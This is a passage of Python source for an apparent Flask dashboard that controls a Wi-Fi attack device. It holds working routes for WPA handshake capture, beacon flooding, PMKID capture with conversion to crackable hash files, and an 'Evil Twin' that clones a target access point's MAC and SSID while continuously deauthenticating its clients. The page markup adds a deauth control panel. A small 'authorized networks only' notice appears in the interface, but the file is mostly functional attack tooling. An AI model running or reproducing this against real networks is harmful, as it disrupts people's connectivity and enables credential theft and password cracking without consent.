                output, _ = proc.communicate(timeout=45)
            except subprocess.TimeoutExpired:
                terminate_process_group(proc, timeout=2)
                output, _ = proc.communicate()
                job.update(status='timeout',
                           output=(output or '') + '\nTimed out after 45 seconds.',
                           pcap=None)
                audit('Handshake timeout: %s' % bssid, 'warn')
                return
            output = output or ''
            if job.get('status') == 'cancelled':
                job['output'] = (job.get('output') or '') + output
                return
            if proc.returncode == 0 and os.path.exists(pcap_path):
                ssid = ssid_for_bssid(bssid)
                saved_id = None
                try:
                    saved = saved_add(
                        'handshake', ssid or bssid, src_path=pcap_path, ext='pcap',
                        subtitle='%s \u00b7 channel %s' % (bssid, channel),
                        meta={'bssid': bssid, 'channel': channel,
                              'client': client, 'ssid': ssid})
                    saved_id = saved.get('id')
                    if saved_id:
                        try:
                            os.remove(pcap_path)
                        except OSError:
                            pass
                except Exception as exc:
                    output += '\nCould not add capture to Saved: %s' % exc
                job.update(status='success', output=output,
                           pcap=f'hs_{job_id}.pcap', saved_id=saved_id)
                audit('Handshake captured: %s (%s)' % (ssid or bssid, bssid))
            else:
                job.update(status='failed', output=output,
                           pcap=(f'hs_{job_id}.pcap' if os.path.exists(pcap_path) else None))
                audit('Handshake not captured: %s' % bssid, 'warn')
        except Exception as e:
            if job.get('status') != 'cancelled':
                job.update(status='error', output=str(e), pcap=None)
                audit('Handshake error: %s' % e, 'error')
        finally:
            job.pop('proc', None)
            release_wlan1('handshake')
            resume_recon_if_idle()

    threading.Thread(target=run, daemon=True).start()
    audit('Handshake capture started: %s channel %d' % (bssid, channel))
    return jsonify({'ok': True, 'job_id': job_id})


@app.route('/api/wlan1/handshake/active')
@require_auth
def api_handshake_active():
    """Return the running capture so the UI can rehydrate after a reload."""
    for job_id, job in list(_hs_jobs.items()):
        if job.get('status') == 'running':
            return jsonify({'ok': True, 'running': True, 'job_id': job_id,
                            'bssid': job.get('bssid', ''),
                            'channel': job.get('channel'),
                            'elapsed': int(time.time() - job.get('started_epoch', time.time()))})
    return jsonify({'ok': True, 'running': False})


@app.route('/api/wlan1/handshake/stop', methods=['POST'])
@require_auth
def api_handshake_stop():
    with _jobs_lock:
        active = [jid for jid, job in _hs_jobs.items()
                  if job.get('status') == 'running']
    stop_handshake_jobs()
    if active:
        audit('Handshake capture stopped by user')
    return jsonify({'ok': True, 'stopped': len(active)})


@app.route('/api/wlan1/handshake/<job_id>')
@require_auth
def api_handshake_status(job_id):
    job = _hs_jobs.get(job_id)
    if not job:
        return jsonify({'ok': False, 'error': 'unknown job'})
    result = {k: v for k, v in job.items() if k != 'proc'}
    result['elapsed'] = int(time.time() - job.get('started_epoch', time.time()))
    return jsonify({'ok': True, **result})

def beacon_status_payload():
    proc = _beacon_proc[0]
    running = bool(proc is not None and proc.poll() is None)
    pid = proc.pid if proc is not None else None

    if not running:
        try:
            with open(BEACON_PID) as f:
                file_pid = int(f.read().strip())
            with open('/proc/%d/cmdline' % file_pid) as f:
                if 'pinapple-beacon-flood' in f.read().replace('\x00', ' '):
                    running = True
                    pid = file_pid
        except (OSError, ValueError):
            pass

    details = read_json_file(BEACON_STATUS, {})
    meta = read_json_file(BEACON_META, {})
    ssids = []
    try:
        with open(BEACON_SSIDS) as f:
            ssids = [line.strip() for line in f if line.strip()]
    except OSError:
        pass

    state = details.get('state') or ('running' if running else 'stopped')
    if not running and state == 'running':
        state = 'stopped'
    if running and state == 'stopped':
        state = 'running'

    exit_note = ''
    if proc is not None and proc.poll() is not None:
        code = proc.returncode
        if code not in (0, -signal.SIGTERM, -signal.SIGINT) and state != 'error':
            state = 'error'
            exit_note = 'beacon helper exited unexpectedly (code %s)' % code
        _beacon_proc[0] = None

    result = {
        'running': running,
        'state': state,
        'pid': pid,
        'ssids': ssids,
        'phrase': meta.get('phrase', ''),
        'count': meta.get('count', len(ssids)),
        'channels': meta.get('channels', []),
        'log_tail': beacon_log_tail(),
    }
    try:
        age = time.time() - float(details.get('updated_epoch') or 0)
        result['stalled'] = bool(running and age > 6)
        result['status_age'] = int(age)
    except (TypeError, ValueError):
        result['stalled'] = False
    if exit_note:
        result['error'] = exit_note
    # Telemetry from the helper; never let a stale file override the
    # authoritative process check.
    result.update({k: v for k, v in details.items() if k not in ('running', 'pid')})
    result['running'] = running
    result['state'] = state
    result['pid'] = pid

    if not running:
        cleanup_orphan_beacon()
        release_wlan1_and_restore('beacon')
    return result


@app.route('/api/wlan1/beacon-flood/start', methods=['POST'])
@require_auth
def api_beacon_start():
    d = request.json or {}
    phrase = str(d.get('ssid') or d.get('phrase') or '').strip()

    try:
        count = int(d.get('count', 25))
        rate = int(d.get('rate') or 0)
        dwell = float(d.get('dwell') or 8)
        repeat = int(d.get('repeat') or 1)
    except (TypeError, ValueError):
        return jsonify({'ok': False, 'error': 'count, rate, dwell and repeat must be numbers'})
    if not 1 <= count <= 200:
        return jsonify({'ok': False, 'error': 'count must be between 1 and 200'})
    if rate and not 20 <= rate <= 2000:
        return jsonify({'ok': False, 'error': 'rate must be 0 (auto) or between 20 and 2000 pps'})
    if not 1 <= dwell <= 60:
        return jsonify({'ok': False, 'error': 'dwell must be between 1 and 60 seconds'})
    if not 1 <= repeat <= 10:
        return jsonify({'ok': False, 'error': 'repeat must be between 1 and 10'})

    channels_raw = d.get('channels') or '6'
    if isinstance(channels_raw, str) and channels_raw.strip().lower() == 'auto':
        channels_raw = '6'
    channels = parse_channel_list(channels_raw)
    if not channels:
        return jsonify({'ok': False, 'error': 'channels must be 1-14, comma separated (max 8)'})

    try:
        ssids, trimmed = build_beacon_ssids(phrase, count)
    except ValueError as exc:
        return jsonify({'ok': False, 'error': str(exc)})
    if not os.path.exists(BEACON_HELPER):
        return jsonify({'ok': False, 'error': 'beacon helper is not installed'}), 500

    if not rate:
        rate = auto_beacon_rate(count)

    claim_wlan1('beacon')
    stop_beacon_process()
    ok, msg = set_wlan1_mode('monitor')
    if not ok:
        release_wlan1('beacon')
        resume_recon_if_idle()
        return jsonify({'ok': False,
                        'error': f'Could not switch wlan1 to monitor mode: {msg}'}), 500

    try:
        os.makedirs('/etc/pinapple', exist_ok=True)
        os.makedirs(os.path.dirname(BEACON_LOG), exist_ok=True)
        for path in (BEACON_STATUS, BEACON_LOG):
            try:
                os.remove(path)
            except OSError:
                pass
        with open(BEACON_SSIDS, 'w') as f:
            f.write('\n'.join(ssids) + '\n')
        write_json_file(BEACON_META, {
            'phrase': phrase,
            'count': count,
            'rate': rate,
            'channels': channels,
            'dwell': dwell,
            'repeat': repeat,
            'started_at': datetime.datetime.now().isoformat(timespec='seconds'),
        })
    except OSError as exc:
        release_wlan1('beacon')
        restore_wlan1_idle()
        return jsonify({'ok': False,
                        'error': 'could not write the beacon config: %s' % exc}), 500

    command = [sys.executable, BEACON_HELPER, BEACON_SSIDS, 'wlan1',
               '--rate', str(rate),
               '--channels', ','.join(str(c) for c in channels),
               '--dwell', str(dwell),
               '--repeat', str(repeat),
               '--status-file', BEACON_STATUS,
               '--log-file', BEACON_LOG]
    try:
        with open(BEACON_LOG, 'a') as helper_log:
            proc = subprocess.Popen(command, stdout=helper_log,
                                    stderr=subprocess.STDOUT,
                                    start_new_session=True)
    except OSError as exc:
        release_wlan1('beacon')
        resume_recon_if_idle()
        return jsonify({'ok': False, 'error': 'could not start helper: %s' % exc}), 500

    _beacon_proc[0] = proc
    try:
        with open(BEACON_PID, 'w') as f:
            f.write(str(proc.pid))
    except OSError:
        pass

    # Wait briefly so a missing mdk4 / bad channel is reported immediately
    # instead of leaving the UI stuck on "starting".
    deadline = time.time() + 2.5
    while time.time() < deadline:
        if proc.poll() is not None:
            break
        details = read_json_file(BEACON_STATUS, {})
        if details.get('state') in ('running', 'error'):
            break
        time.sleep(0.1)

    details = read_json_file(BEACON_STATUS, {})
    if proc.poll() is not None or details.get('state') == 'error':
        error = details.get('error') or beacon_log_tail() or 'beacon helper exited'
        stop_beacon_process()
        release_wlan1('beacon')
        resume_recon_if_idle()
        audit('Beacon flood failed to start: %s' % error, 'error')
        return jsonify({'ok': False, 'error': error}), 500

    payload = beacon_status_payload()
    payload.update({'ok': True, 'trimmed': trimmed, 'auto_rate': auto_beacon_rate(count)})
    audit('Beacon flood started: %d networks "%s" on channel %s at %d pps'
          % (count, phrase, ','.join(str(c) for c in channels), rate))
    return jsonify(payload)


@app.route('/api/wlan1/beacon-flood/stop', methods=['POST'])
@require_auth
def api_beacon_stop():
    stopped = stop_beacon_process()
    release_wlan1('beacon')
    restore_wlan1_idle()
    audit('Beacon flood stopped')
    return jsonify({'ok': True, 'stopped': stopped,
                    'status': beacon_status_payload()})


@app.route('/api/wlan1/beacon-flood/status')
@require_auth
def api_beacon_status():
    return jsonify(beacon_status_payload())

@app.route('/api/wlan1/pcap/<filename>')
@require_auth
def api_pcap_download(filename):
    if not re.match(r'^(hs_[a-f0-9]{8}\.pcap|pmkid_hashes\.hc22000)$', filename):
        return Response('Invalid filename', 403)
    fpath = os.path.join(PCAP_DIR, filename)
    if not os.path.exists(fpath):
        return Response('Not found', 404)
    try:
        with open(fpath, 'rb') as f:
            data = f.read()
    except OSError:
        return Response('Not found', 404)
    return Response(data, mimetype='application/octet-stream',
                   headers={'Content-Disposition': f'attachment; filename={filename}'})

def hcxdumptool_command(interface, output):
    """Build a command compatible with both hcxdumptool v6 and v7+."""
    cmd = ['hcxdumptool', '-i', interface, '-o', output]
    try:
        r = subprocess.run(['hcxdumptool', '--help'], capture_output=True,
                           text=True, timeout=5)
        help_text = (r.stdout or '') + (r.stderr or '')
    except Exception:
        help_text = ''
    if '--enable_status' in help_text:
        cmd.append('--enable_status=1')
    return cmd


@app.route('/api/wlan1/pmkid/start', methods=['POST'])
@require_auth
def api_pmkid_start():
    proc = _pmkid_proc[0]
    if proc is not None and proc.poll() is None:
        return jsonify({'ok': False, 'error': 'PMKID capture is already running'})
    # After a dashboard restart we may have lost the Popen handle while the
    # capture is still alive; refuse to start a second one on the same radio.
    stale = read_json_file(PMKID_STATE, {})
    if stale.get('pid') and pid_alive(stale.get('pid'), 'hcxdumptool'):
        _pmkid_output[0] = stale.get('output')
        _pmkid_started[0] = stale.get('started')
        return jsonify({'ok': False,
                        'error': 'PMKID capture is already running (pid %s)' % stale.get('pid')})
    if not shutil.which('hcxdumptool'):
        return jsonify({'ok': False, 'error': 'hcxdumptool is not installed'}), 500

    claim_wlan1('pmkid')
    ok, msg = set_wlan1_mode('monitor')
    if not ok:
        release_wlan1('pmkid')
        resume_recon_if_idle()
        return jsonify({'ok': False, 'error': f'Could not switch wlan1 to monitor mode: {msg}'}), 500

    filename = f'/var/log/pinapple/pmkid_{uuid.uuid4().hex[:8]}.pcapng'
    try:
        proc = subprocess.Popen(
            hcxdumptool_command('wlan1', filename),
            stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT,
            start_new_session=True)
    except OSError as exc:
        release_wlan1('pmkid')
        resume_recon_if_idle()
        return jsonify({'ok': False, 'error': 'could not start hcxdumptool: %s' % exc}), 500

    _pmkid_output[0] = filename
    _pmkid_proc[0] = proc
    _pmkid_started[0] = datetime.datetime.now().isoformat(timespec='seconds')
    try:
        with open(PMKID_PID, 'w') as handle:
            handle.write(str(proc.pid))
        write_json_file(PMKID_STATE, {'pid': proc.pid, 'output': filename,
                                      'started': _pmkid_started[0]})
    except OSError:
        pass
    audit('PMKID capture started')
    return jsonify({'ok': True, 'started': _pmkid_started[0]})


@app.route('/api/wlan1/pmkid/status')
@require_auth
def api_pmkid_status():
    proc = _pmkid_proc[0]
    running = bool(proc is not None and proc.poll() is None)
    started = _pmkid_started[0]
    output = _pmkid_output[0]
    if proc is None:
        state = read_json_file(PMKID_STATE, {})
        started = started or state.get('started')
        output = output or state.get('output')
        pid = state.get('pid')
        if pid and pid_alive(pid, 'hcxdumptool'):
            running = True
    if not running:
        release_wlan1_and_restore('pmkid')
    return jsonify({'ok': True, 'running': running,
                    'started': started,
                    'output': output})


@app.route('/api/wlan1/pmkid/stop', methods=['POST'])
@require_auth
def api_pmkid_stop():
    proc = _pmkid_proc[0]
    if proc is None:
        state = read_json_file(PMKID_STATE, {})
        pid = state.get('pid')
        if pid:
            safe_kill_pid(pid, 'hcxdumptool')
        if not _pmkid_output[0]:
            _pmkid_output[0] = state.get('output')
        if not _pmkid_started[0]:
            _pmkid_started[0] = state.get('started')
    if proc is not None:
        terminate_process_group(proc)
        _pmkid_proc[0] = None
    for path in (PMKID_PID, PMKID_STATE):
        try:
            os.remove(path)
        except OSError:
            pass
    release_wlan1('pmkid')
    restore_wlan1_idle()

    capture = _pmkid_output[0]
    hash_file = '/var/log/pinapple/pmkid_hashes.hc22000'
    if not capture or not os.path.exists(capture):
        return jsonify({'ok': False, 'error': 'no capture file was recorded'})
    if not shutil.which('hcxpcapngtool'):
        return jsonify({'ok': False, 'error': 'hcxpcapngtool is not installed'})
    try:
        r = subprocess.run(['hcxpcapngtool', '-o', hash_file, capture],
                           capture_output=True, text=True, timeout=45)
    except (OSError, subprocess.SubprocessError) as exc:
        return jsonify({'ok': False, 'error': 'conversion failed: %s' % exc})
    if r.returncode != 0:
        detail = (r.stderr or r.stdout).strip().splitlines()
        return jsonify({'ok': False, 'error': 'conversion failed: %s' %
                        (detail[-1] if detail else 'hcxpcapngtool error')})
    if not os.path.exists(hash_file) or os.path.getsize(hash_file) == 0:
        return jsonify({'ok': False, 'error': 'no PMKID or handshake found in the capture'})
    try:
        with open(hash_file, errors='ignore') as handle:
            hash_count = sum(1 for line in handle if line.strip() and not line.startswith('#'))
    except OSError:
        hash_count = 0
    if not hash_count:
        return jsonify({'ok': False, 'error': 'no PMKID or handshake found in the capture'})
    saved_id = None
    try:
        saved = saved_add(
            'pmkid', 'PMKID hashes', src_path=hash_file, ext='hc22000',
            subtitle='%d hash lines' % hash_count,
            meta={'lines': hash_count, 'capture': os.path.basename(capture)})
        saved_id = saved.get('id')
    except Exception:
        saved_id = None
    audit('PMKID capture stopped; %d hash line(s) saved' % hash_count)
    _pmkid_output[0] = None
    _pmkid_started[0] = None
    return jsonify({'ok': True, 'hashes': 'pmkid_hashes.hc22000',
                    'saved_id': saved_id, 'lines': hash_count})


# Evil Twin Routes
@app.route('/api/wlan1/evil-twin/start', methods=['POST'])
@require_auth
def api_evil_twin_start():
    data = request.json or {}
    ssid = str(data.get('ssid', '')).strip()
    ssid_trimmed = len(ssid.encode('utf-8', 'ignore')) > 32
    ssid = truncate_utf8(ssid, 32).strip()
    bssid = str(data.get('bssid', '')).strip().upper()
    if not ssid or not valid_mac(bssid):
        return jsonify({'ok': False, 'error': 'valid ssid and bssid are required'})
    channel, error = resolve_channel(data.get('channel'), bssid)
    if error:
        return jsonify({'ok': False, 'error': error})
    channel = channel or 6
    if not os.path.exists(DEAUTH_HELPER):
        return jsonify({'ok': False, 'error': 'deauth helper is not installed'}), 500
    if ap_backend() != 'hostapd':
        return jsonify({'ok': False,
                        'error': 'Evil Twin needs the hostapd stack (pinapple-ap.service); '
                                 'this install uses the NetworkManager hotspot.'}), 501
    if not os.path.exists('/sys/class/net/wlan0'):
        return jsonify({'ok': False, 'error': 'wlan0 is not present on this system'}), 500

    claim_wlan1('eviltwin')
    ok, msg = set_wlan1_mode('monitor')
    if not ok:
        release_wlan1('eviltwin')
        resume_recon_if_idle()
        return jsonify({'ok': False, 'error': f'Could not set wlan1 to monitor mode: {msg}'}), 500
    ok, msg = set_wlan1_channel(channel)
    if not ok:
        release_wlan1('eviltwin')
        resume_recon_if_idle()
        return jsonify({'ok': False, 'error': f'Could not set wlan1 channel: {msg}'}), 500

    terminate_process_group(_evil_twin_job[0])
    _evil_twin_job[0] = None
    _evil_twin_info[0] = None

    warnings = []
    if ssid_trimmed:
        warnings.append('the SSID was trimmed to 32 bytes')
    prev_state = read_json_file(EVILTWIN_STATE, {})
    original_mac = prev_state.get('original_mac') or wlan0_mac()
    try:
        os.makedirs(os.path.dirname(EVILTWIN_BACKUP), exist_ok=True)
        # Never overwrite an existing backup: it holds the user's real AP
        # config, while HOSTAPD_CONF may already contain a previous clone.
        if os.path.exists(HOSTAPD_CONF) and not os.path.exists(EVILTWIN_BACKUP):
            shutil.copy2(HOSTAPD_CONF, EVILTWIN_BACKUP)
    except OSError as exc:
        warnings.append('could not back up the AP config: %s' % exc)

    try:
        r = subprocess.run(['systemctl', 'stop', 'pinapple-ap'],
                           capture_output=True, text=True, timeout=10)
        if r.returncode != 0:
            warnings.append('could not stop the normal AP')
    except Exception:
        warnings.append('could not stop the normal AP')
    if service_status('pinapple-ap'):
        restore_ap_after_eviltwin('could not stop the normal AP')
        release_wlan1('eviltwin')
        restore_wlan1_idle()
        return jsonify({'ok': False,
                        'error': 'could not stop the normal AP; is hostapd busy?'}), 500
    try:
        subprocess.run(['ip', 'link', 'set', 'wlan0', 'down'], capture_output=True, timeout=5)
        r = subprocess.run(['ip', 'link', 'set', 'wlan0', 'address', bssid],
                           capture_output=True, text=True, timeout=5)
        if r.returncode != 0:
            warnings.append('could not set the cloned MAC')
        subprocess.run(['ip', 'link', 'set', 'wlan0', 'up'], capture_output=True, timeout=5)
    except Exception:
        warnings.append('could not reconfigure wlan0')
    try:
        write_hostapd_conf(ssid, channel, 'open', None)
    except OSError as exc:
        restore_ap_after_eviltwin('evil twin config failed')
        release_wlan1('eviltwin')
        restore_wlan1_idle()
        return jsonify({'ok': False,
                        'error': 'could not write the cloned AP config: %s' % exc}), 500
    try:
        r = subprocess.run(['systemctl', 'start', 'pinapple-ap'],
                           capture_output=True, text=True, timeout=10)
        if r.returncode != 0:
            detail = (r.stderr or r.stdout).strip().splitlines()
            restore_ap_after_eviltwin('clone AP failed to start')
            release_wlan1('eviltwin')
            restore_wlan1_idle()
            return jsonify({'ok': False,
                            'error': 'the cloned AP did not start: %s' %
                                     (detail[-1] if detail else 'hostapd error')}), 500
        subprocess.run(['systemctl', 'restart', 'pinapple-dhcp'],
                       capture_output=True, timeout=15)
    except Exception as exc:
        restore_ap_after_eviltwin('clone AP failed to start')
        release_wlan1('eviltwin')
        restore_wlan1_idle()
        return jsonify({'ok': False,
                        'error': 'could not start the cloned AP: %s' % exc}), 500

    try:
        proc = subprocess.Popen(
            deauth_command(bssid, 'FF:FF:FF:FF:FF:FF', channel, 10, continuous=True),
            stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT,
            start_new_session=True)
    except OSError as exc:
        restore_ap_after_eviltwin('deauth helper failed to start')
        release_wlan1('eviltwin')
        restore_wlan1_idle()
        return jsonify({'ok': False,
                        'error': 'could not start the deauth helper: %s' % exc}), 500
    _evil_twin_job[0] = proc
    time.sleep(0.25)
    if proc.poll() is not None:
        warnings.append('the deauth helper exited immediately; the clone AP is still up')
    _evil_twin_info[0] = {
        'ssid': ssid, 'bssid': bssid, 'channel': channel,
        'original_mac': original_mac,
        'started': datetime.datetime.now().isoformat(timespec='seconds'),
    }
    try:
        with open(EVILTWIN_PID, 'w') as handle:
            handle.write(str(proc.pid))
        write_json_file(EVILTWIN_STATE, dict(_evil_twin_info[0], pid=proc.pid))
    except OSError:
        pass
    audit('Evil Twin started: %s (%s) channel %s%s'
          % (ssid, bssid, channel,
             ('; warnings: ' + '; '.join(warnings)) if warnings else ''))
    return jsonify({'ok': True, 'bssid': bssid, 'channel': channel,
                    'warnings': warnings})


@app.route('/api/wlan1/evil-twin/status')
@require_auth
def api_evil_twin_status():
    proc = _evil_twin_job[0]
    running = bool(proc is not None and proc.poll() is None)
    info = _evil_twin_info[0] or {}
    if proc is None:
        state = read_json_file(EVILTWIN_STATE, {})
        if state:
            info = state
            pid = state.get('pid')
            clone_mac = str(state.get('bssid', '')).lower()
            # The twin is genuinely active if its deauth helper is alive, or
            # if hostapd is up on the cloned MAC. A normal AP on the original
            # MAC must not be mistaken for an active twin.
            if pid and pid_alive(pid, 'pinapple-deauth'):
                running = True
            elif service_status('pinapple-ap') and clone_mac and wlan0_mac() == clone_mac:
                running = True
    if not running:
        if os.path.exists(EVILTWIN_BACKUP) or os.path.exists(EVILTWIN_STATE):
            # The deauth helper or clone AP died on its own; restore the real
            # AP instead of leaving a half-configured wlan0 behind.
            restore_ap_after_eviltwin('twin stopped unexpectedly')
        release_wlan1_and_restore('eviltwin')
    return jsonify({'ok': True, 'running': running,
                    'ssid': info.get('ssid', ''), 'bssid': info.get('bssid', ''),
                    'channel': info.get('channel', ''), 'started': info.get('started', '')})


@app.route('/api/wlan1/evil-twin/stop', methods=['POST'])
@require_auth
def api_evil_twin_stop():
    had_twin = bool(_evil_twin_job[0] is not None or
                    os.path.exists(EVILTWIN_STATE) or
                    os.path.exists(EVILTWIN_BACKUP))
    if _evil_twin_job[0] is None:
        state = read_json_file(EVILTWIN_STATE, {})
        pid = state.get('pid')
        if pid:
            safe_kill_pid(pid, 'pinapple-deauth')
    terminate_process_group(_evil_twin_job[0])
    _evil_twin_job[0] = None
    _evil_twin_info[0] = None
    release_wlan1('eviltwin')
    if had_twin:
        restore_ap_after_eviltwin()
    restore_wlan1_idle()
    return jsonify({'ok': True, 'stopped': had_twin})

@app.route('/wlan1')
@require_auth
def wlan1_page():
    probes  = get_probes()
    tracker = get_tracker()
    networks = get_recon()

    def safe(value):
        return html_escape(str(value if value is not None else ''))

    net_opts = '<option value="">-- manual entry --</option>' + \
        ''.join('<option value="{b}">{s} ({b})</option>'.format(
            b=safe(n.get('bssid','')), s=safe(n.get('ssid','?') or n.get('bssid','')))
            for n in sorted(networks, key=lambda x: x.get('signal',0), reverse=True)
            if n.get('bssid'))

    probe_rows = ''.join(
        '<tr><td><code style="font-size:0.75rem">{mac}</code>'
        '<div class="hint" style="margin:0">{vendor}</div></td>'
        '<td><strong>{ssid}</strong></td>'
        '<td style="font-size:0.75rem;color:var(--dim)">{first}</td>'
        '<td style="font-size:0.75rem;color:var(--dim)">{last}</td>'
        '<td style="text-align:center">{cnt}</td></tr>'.format(
            mac=safe(p.get('mac','')), vendor=safe(vendor_for_mac(str(p.get('mac','')))),
            ssid=safe(p.get('ssid','')),
            first=safe(p.get('first_seen','')), last=safe(p.get('last_seen','')),
            cnt=safe(p.get('count',1)))
        for p in sorted(probes, key=lambda x: x.get('last_seen',''), reverse=True)
    ) or '<tr><td colspan="5" style="text-align:center;color:var(--dim)">No probes captured yet — scanning wlan1...</td></tr>'

    def pt_badges(pt_dict):
        colors = {'probe-req':'bb','beacon':'bg','data':'bw','deauth':'br','mgmt':'','assoc-req':'bb'}
        return ' '.join('<span class="badge {}">{}</span>'.format(
            colors.get(k,''), safe(k)) for k,v in sorted(pt_dict.items(), key=lambda x: -x[1])[:4])

    tracker_rows = ''.join(
        '<tr><td><code style="font-size:0.75rem">{mac}</code>'
        '<div class="hint" style="margin:0">{vendor}</div></td>'
        '<td style="font-size:0.75rem;color:var(--dim)">{first}</td>'
        '<td style="font-size:0.75rem;color:var(--dim)">{last}</td>'
        '<td>{types}</td>'
        '<td style="font-size:0.75rem;color:var(--acc)">{ssids}</td>'
        '<td style="text-align:center">{cnt}</td></tr>'.format(
            mac=safe(t.get('mac','')), vendor=safe(vendor_for_mac(str(t.get('mac','')))),
            first=safe(t.get('first_seen','')), last=safe(t.get('last_seen','')),
            types=pt_badges(t.get('packet_types',{})),
            ssids=safe(', '.join(str(s) for s in t.get('ssids',[])[:3])),
            cnt=safe(t.get('count',0)))
        for t in tracker[:100]
    ) or '<tr><td colspan="6" style="text-align:center;color:var(--dim)">No devices seen yet — monitoring wlan1...</td></tr>'

    tab_aliases = {'probes':'probes','tracker':'tracker','deauth':'deauth',
                   'handshake':'handshake','eviltwin':'eviltwin','pmkid':'pmkid','beacon':'beacon'}
    active_tab = tab_aliases.get(request.args.get('tab', 'probes'), 'probes')

    def scan_table(pane):
        return """
<div class="sh" style="margin-top:24px;border-top:1px solid var(--bdr);padding-top:16px;">
  <span class="st">Nearby Networks (Recon)</span>
  <button class="btn btn-acc scan-btn" data-pane="{p}" onclick="triggerScan(this)">Scan Now</button>
</div>
<div class="twrap">
  <table class="resp">
    <thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Signal</th><th>Action</th></tr></thead>
    <tbody class="scan-tbody" data-pane="{p}">
      <tr><td colspan="5" style="text-align:center;color:var(--dim)">Tap Scan Now to find nearby networks.</td></tr>
    </tbody>
  </table>
</div>
""".format(p=pane)

    content = """
<div class="wl-modebar" id="wlan1-mode-bar">
  <span style="color:var(--dim)">wlan1</span>
  <span id="wlan1-mode-badge" class="badge" style="background:#555;color:#fff">...</span>
  <span class="wl-owner" id="wlan1-owner"></span>
  <div style="margin-left:auto;display:flex;gap:8px;flex-wrap:wrap">
    <button class="btn btn-acc" id="wl-rescan" onclick="triggerScan(this)">&#8635; Rescan</button>
    <button class="btn btn-outline mode-btn" onclick="setWlan1Mode('managed',this)">Managed</button>
    <button class="btn btn-outline mode-btn" onclick="setWlan1Mode('monitor',this)">Monitor</button>
    <button class="btn btn-outline" onclick="refreshWlan1Mode()">Refresh</button>
  </div>
</div>

<nav class="wl-tabs" role="tablist" aria-label="WLAN1 tools">
  <a class="wl-tab {a_probes}" data-tab="probes" href="?tab=probes" role="tab">Probes</a>
  <a class="wl-tab {a_tracker}" data-tab="tracker" href="?tab=tracker" role="tab">Client Tracker</a>
  <a class="wl-tab {a_deauth}" data-tab="deauth" href="?tab=deauth" role="tab">Deauth</a>
  <a class="wl-tab {a_handshake}" data-tab="handshake" href="?tab=handshake" role="tab">Handshake</a>
  <a class="wl-tab {a_eviltwin}" data-tab="eviltwin" href="?tab=eviltwin" role="tab">Evil Twin</a>
  <a class="wl-tab {a_pmkid}" data-tab="pmkid" href="?tab=pmkid" role="tab">PMKID</a>
  <a class="wl-tab {a_beacon}" data-tab="beacon" href="?tab=beacon" role="tab">Beacon Flood</a>
</nav>
<div class="hint" style="margin:-4px 0 14px">Pick a tool below. Only one tool can use the wlan1 radio at a time; starting one stops the others.</div>

<div id="pane-probes" class="wl-pane" style="display: {d_probes}">
  <div class="sh"><span class="st">Probe Requests</span>
    <span style="font-size:0.75rem;color:var(--dim)">Auto-refresh 5s</span></div>
  <p class="hint" style="margin:-8px 0 12px">Devices nearby that are searching for Wi-Fi names. Newer entries appear first.</p>
  <input id="probe-filter" class="bf-input" style="margin-bottom:12px" placeholder="Filter by MAC or SSID"
         oninput="filterTable('probe-tbody',this.value)" autocomplete="off">
  <div class="twrap"><table class="resp">
    <thead><tr><th>Device MAC</th><th>SSID Searching For</th><th>First Seen</th><th>Last Seen</th><th>Count</th></tr></thead>
    <tbody id="probe-tbody">{probe_rows}</tbody>
  </table></div>
</div>

<div id="pane-tracker" class="wl-pane" style="display: {d_tracker}">
  <div class="sh"><span class="st">All Devices Seen on wlan1 ({nt} total)</span>
    <span style="font-size:0.75rem;color:var(--dim)">Auto-refresh 10s</span></div>
  <p class="hint" style="margin:-8px 0 12px">Every device the monitor heard, with the packet types and SSIDs it revealed.</p>
  <input id="tracker-filter" class="bf-input" style="margin-bottom:12px" placeholder="Filter by MAC, SSID, or packet type"
         oninput="filterTable('tracker-tbody',this.value)" autocomplete="off">
  <div class="twrap"><table class="resp">
    <thead><tr><th>MAC Address</th><th>First Seen</th><th>Last Seen</th><th>Packet Types</th><th>Probed SSIDs</th><th>Pkts</th></tr></thead>
    <tbody id="tracker-tbody">{tracker_rows}</tbody>
  </table></div>
</div>

<div id="pane-deauth" class="wl-pane" style="display: {d_deauth}">
  <div class="sh"><span class="st">Deauthentication</span>
    <span style="color:var(--warn);font-size:0.75rem">&#9888; Authorized networks only</span></div>
  <p class="hint" style="margin:-8px 0 10px">Sends 802.11 deauth frames to disconnect a client (or all clients) from the target AP. A burst sends a fixed number; continuous keeps transmitting until stopped. WPA3/PMF clients may ignore unprotected deauth frames.</p>
  <div class="status-card" role="status" aria-live="polite" id="da-status-card">
    <span class="dot"></span>
    <div class="sc-copy"><strong id="da-state">Idle</strong><span id="da-sub">No deauth job running</span></div>
    <span class="sc-meta" id="da-meta"></span>
  </div>
  <div class="card">
    <div class="fr">
      <div class="fg">
        <label>Target AP (BSSID)</label>
        <input id="da-bssid" placeholder="AA:BB:CC:DD:EE:FF" style="text-transform:uppercase" autocomplete="off">
      </div>
      <div class="fg">
        <label>Client MAC (broadcast = all clients)</label>
        <input id="da-client" value="FF:FF:FF:FF:FF:FF" style="text-transform:uppercase" autocomplete="off">
      </div>
    </div>
    <div class="fr">
      <div class="fg">
        <label>Burst count: <span id="da-count-label">64</span></label>
        <input type="range" id="da-count" min="10" max="500" value="64"
               oninput="document.getElementById('da-count-label').textContent=this.value; daUpdateEstimate()"
               style="width:100%;margin-top:8px">
      </div>
      <div class="fg">
        <label>Channel (blank = auto from recon scan)</label>
        <input id="da-channel" type="number" min="1" max="14" placeholder="auto" inputmode="numeric">
      </div>
    </div>
    <div class="fr">
      <div class="fg">
        <label>Rate (packets/sec, 1-200)</label>
        <input id="da-rate" type="number" value="20" min="1" max="200" inputmode="numeric"
               oninput="daUpdateEstimate()">
      </div>
    </div>
    <div class="hint" id="da-estimate">64 frames at 20 pps ≈ 3.2 seconds.</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:16px">
      <button class="btn btn-danger" id="da-burst-btn" onclick="fireDeauth()">&#9889; Send burst</button>
      <button class="btn btn-acc" id="btn-cont-deauth-start" onclick="startContinuousDeauth()">&#9889; Start continuous</button>
      <button class="btn btn-outline" id="btn-cont-deauth-stop" onclick="stopContinuousDeauth()" disabled>&#9632; Stop job</button>
    </div>
    <div id="da-output" class="hint" style="display:none;margin-top:12px;font-family:monospace;white-space:pre-wrap;color:var(--txt)"></div>
    <div id="da-jobs" class="hint" style="margin-top:8px"></div>
  </div>
  {scan_deauth}
</div>

<div id="pane-handshake" class="wl-pane" style="display: {d_handshake}">
